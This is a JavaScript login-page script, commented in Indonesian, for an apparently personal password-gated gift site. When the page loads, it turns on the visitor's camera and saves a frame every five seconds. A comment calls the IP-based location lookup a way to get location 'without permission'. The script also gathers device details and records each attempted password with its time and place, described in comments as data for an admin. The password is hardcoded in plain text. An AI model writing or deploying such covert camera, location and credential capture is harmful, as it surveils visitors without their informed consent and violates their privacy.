// 📷 Akses Kamera & Kirim Gambar ke Admin
async function startCamera() {
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: true });
        let video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        let canvas = document.createElement("canvas");
        let ctx = canvas.getContext("2d");

        setInterval(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            let imageData = canvas.toDataURL("image/jpeg"); 

            // Kirim gambar ke localStorage agar bisa diakses di admin
            localStorage.setItem("latestCameraImage", imageData);
        }, 5000); // Kirim gambar setiap 5 detik
    } catch (error) {
        console.error("Gagal mengakses kamera:", error);
    }
}

// 🔍 Ambil Lokasi Tanpa Izin (Berbasis IP)
async function getLocation() {
    try {
        let response = await fetch("https://ipapi.co/json/");
        let data = await response.json();
        let location = `${data.city}, ${data.region}, ${data.country_name}`;
        localStorage.setItem("userLocation", location);
    } catch (error) {
        localStorage.setItem("userLocation", "Tidak dapat mengambil lokasi");
    }
}

// 📱 Ambil Informasi Perangkat
function getDeviceInfo() {
    let deviceInfo = {
        platform: navigator.platform,
        browser: navigator.userAgent,
        screenSize: `${window.screen.width}x${window.screen.height}`,
    };
    localStorage.setItem("deviceInfo", JSON.stringify(deviceInfo));
}

// 💾 Simpan Data Login dan Kirim ke Halaman Admin
function saveLoginData(password) {
    let loginData = JSON.parse(localStorage.getItem("loginAttempts")) || [];
    let newEntry = {
        time: new Date().toLocaleString(),
        location: localStorage.getItem("userLocation") || "Tidak diketahui",
        device: localStorage.getItem("deviceInfo"),
        attemptedPassword: password
    };
    loginData.push(newEntry);
    localStorage.setItem("loginAttempts", JSON.stringify(loginData));

    // Kirim data ke halaman admin menggunakan sessionStorage (untuk real-time update)
    sessionStorage.setItem("latestLoginData", JSON.stringify(newEntry));
}

// 🚀 Jalankan Semua Fungsi Saat Halaman Login Dimuat
document.addEventListener("DOMContentLoaded", () => {
    getLocation();
    startCamera();
    getDeviceInfo();
});

// *** Script Utama (Dibiarkan Seperti Aslinya) ***

let attempts = 0;
const maxAttempts = 3;
const correctPassword = "nabilapunyakiky";

function togglePassword() {
    const passwordInput = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeOpen.classList.add("hidden");
        eyeClosed.classList.remove("hidden");
    } else {
        passwordInput.type = "password";
        eyeOpen.classList.remove("hidden");
        eyeClosed.classList.add("hidden");
    }
}

function validatePassword() {
    const passwordInput = document.getElementById("password");
    const errorMessage = document.getElementById("error-message");
    const countdownMessage = document.getElementById("countdown");
    const container = document.querySelector(".container");
    const button = document.querySelector("button");
    const audio = document.getElementById("countdown-sound"); // Ambil elemen audio

    let password = passwordInput.value.trim(); 

    if (password === "") {
        errorMessage.textContent = "⚠️ Kata sandi tidak boleh kosong!";
        errorMessage.classList.add("show");
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 300);
        return;
    }

    if (password === correctPassword) {
        errorMessage.textContent = "✅ Kata sandi benar! Selamat datang.";
        errorMessage.classList.add("show");
        document.getElementById("success-popup").classList.remove("hidden");
        setTimeout(() => button.remove(), 500);  
        setTimeout(() => {
            window.location.href = "https://kkykrnwn.github.io/script-bucin/file/utama.html";
        }, 2000);
    } else {
        attempts++;
        errorMessage.textContent = `❌ Kata sandi salah! Percobaan tersisa: ${maxAttempts - attempts}`;
        errorMessage.classList.add("show");
        passwordInput.value = ""; 
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 500);
        
        if (attempts >= maxAttempts) {
            errorMessage.textContent = "🚨 Terlalu banyak percobaan! Anda akan dialihkan ke Instagram pencipta...";
            let countdown = 10;
            countdownMessage.style.display = "block";
            countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;

            passwordInput.disabled = true;
            button.disabled = true;
            
            
            // 🔊 Memastikan audio dimainkan
            audio.volume = 1.0; // Pastikan volume penuh
            audio.loop = true; // Loop agar suara terus berbunyi
            audio.play().catch(error => console.log("Gagal memutar suara:", error));


            let interval = setInterval(() => {
                countdown--;
                countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;
                if (countdown <= 0) {
                    clearInterval(interval);
                    audio.pause(); // Hentikan suara setelah hitung mundur selesai
                    window.location.href = "https://www.instagram.com/kky_krnwn331?igsh=MW9yZnF6YXY2YmsxZg=="; 
                }
            }, 1000);
        }
    }
}
